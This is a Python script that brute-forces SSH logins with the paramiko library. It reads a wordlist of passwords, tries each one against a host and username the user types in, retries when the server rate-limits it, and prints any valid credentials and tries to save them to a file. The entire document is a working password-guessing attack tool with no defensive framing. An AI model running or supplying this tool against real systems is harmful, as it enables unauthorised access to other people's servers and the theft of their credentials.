import paramiko
import socket
import time
import threading
import sys
from colorama import init,Fore

init()

BLUE=Fore.BLUE
GREEN=Fore.GREEN
RED=Fore.RED
RESET=Fore.RESET

def is_ssh_open(host,user,passw):
   client=paramiko.SSHClient()
   client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
   try:
     client.connect(hostname=host,username=user,password=passw,timeout=3)
   except socket.timeout:
     print(f"{RED}[!]Host:{host} is unreachable. Timed out.{RESET}")
     return False
     
   except paramiko.AuthenticationException:
     print(f"[!]Invalid credentials for {user}:{passw}")
     return False
     
   except paramiko.SSHException:
     print(f"{BLUE}[*]Connection Quota Exceeded, retrying after sometime...{RESET}")
     
     time.sleep(60)
     
     return is_ssh_open(host,user,passw)
     
   else:
     print(f"{GREEN}Found connection:\n\tHOSTNAME:{host}\n\tUSERNAME:{user}\n\tPASSWORD:{passw}{RESET}")
     return True
     


host=""  
host=input("Enter host ip address :")
user=input("Enter host username:")

lst=[]
passlist=open("worlist.txt")
st=passlist.read()
lst=st.splitlines()
threads=[]
for password in lst:
  if is_ssh_open(host,user,password):
    fh=open("creds.txt","w")
    fh.write("{user}@{host}:{password}")

  
    
